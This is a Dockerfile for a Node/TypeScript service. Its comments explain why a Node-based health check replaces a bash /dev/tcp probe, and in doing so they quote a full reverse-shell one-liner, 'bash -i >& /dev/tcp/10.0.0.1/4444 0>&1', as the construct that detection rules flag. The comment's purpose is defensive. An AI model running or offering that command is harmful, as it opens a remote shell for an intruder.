# One image, two entry points. The reconciler and the mock platform share every
# dependency and all of src/, so two Dockerfiles would mean two builds of the
# same thing and one of them going stale. The compose file picks the command.
#
# No build stage, because there is nothing to build: Node strips TypeScript
# natively, so `src/**.ts` is the artifact. That is why this file is twelve
# lines and why there is no bundler, no dist/ and no sourcemap story.
FROM node:26-alpine

WORKDIR /app

# Dependencies first so an edit to src/ does not reinstall them.
COPY package.json package-lock.json ./
RUN npm ci --omit=dev

COPY db ./db
COPY src ./src

# THE HEALTH CHECK. Exec form, so no shell is involved at all, running an
# ordinary HTTP request from the runtime the image already ships.
#
# DO NOT replace this with `CMD bash -c '< /dev/tcp/127.0.0.1/9900'`. That is
# the conventional answer for an image with no curl, and it is byte-for-byte the
# construct every reverse-shell detection rule is written against: a process
# wiring one of its own standard streams to a network connection instead of a
# terminal. A runtime sensor cannot tell it from
# `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, because the only difference is the
# destination and a signature cannot be written on a destination. See
# src/platform/healthcheck.ts for the full reasoning, and "The Health Check Was
# a Reverse Shell" on fblln.github.io for how that plays out in a security
# console three weeks later.
#
# This also proves MORE than a port check would: a 200 means a server parsed a
# request and answered it, whereas a listening socket only means something
# bound a port. Listening and ready are different states.
HEALTHCHECK --interval=2s --timeout=3s --start-period=3s --retries=15 \
  CMD ["node", "/app/src/platform/healthcheck.ts"]

CMD ["node", "/app/src/platform/main.ts"]
